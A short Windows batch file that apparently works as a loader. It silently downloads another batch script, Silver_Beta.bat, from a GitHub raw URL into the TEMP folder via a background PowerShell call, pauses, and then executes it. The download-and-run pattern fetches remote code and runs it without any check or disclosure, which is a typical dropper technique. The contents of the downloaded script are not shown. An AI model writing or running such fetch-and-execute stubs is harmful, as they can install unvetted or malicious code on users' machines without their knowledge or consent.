@echo off

REM Set the URL of the raw GitHub batch script
set "SCRIPT_URL=https://raw.githubusercontent.com/partymonster2/Batch-Scripts/main/Silver_Beta.bat"

REM Set the temporary file name to download the script
set "TEMP_FILE=%TEMP%\Silver_Beta.bat"

REM Download and run the script from the specified URL in the background
start /b powershell -Command "(New-Object Net.WebClient).DownloadFile('%SCRIPT_URL%', '%TEMP_FILE%')"
ping 127.0.0.1 -n 3 > nul
start "" "%TEMP_FILE%"
